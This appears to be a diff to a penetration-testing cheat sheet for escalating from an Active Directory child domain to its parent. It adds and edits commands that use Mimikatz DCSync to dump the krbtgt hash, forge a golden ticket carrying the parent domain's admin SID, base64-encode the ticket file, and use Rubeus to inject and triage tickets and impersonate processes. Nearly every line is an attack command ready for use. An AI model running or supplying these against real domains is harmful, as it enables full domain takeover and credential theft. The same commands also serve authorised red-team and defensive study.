@@ -17,8 +17,14 @@ Get-DomainForeignGroupMember -Domain [target domain]
 ```
 PowerShell Get-DomainGroup -Identity 'Domain Admins' -Domain [parent domain] | select ObjectSid
 Shell whoami /user
-lsadump::dcsync /user:krbtgt /domain:[child]
+DCSync krbtgt or lsadump::dcsync /user:krbtgt /domain:[child]
 kerberos::golden /user:Administrator /domain:[child domain] /sid:[child domain] /sids:[parenet domain]-512 or 519 /krbtgt:[child domain] /ticket:test.kirbi
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\John\Desktop\test.kirb")) 
+Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
+Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...]
+ImpersonateProcess 2768
+Rubeus triage
+
 ```
 
 * powerview
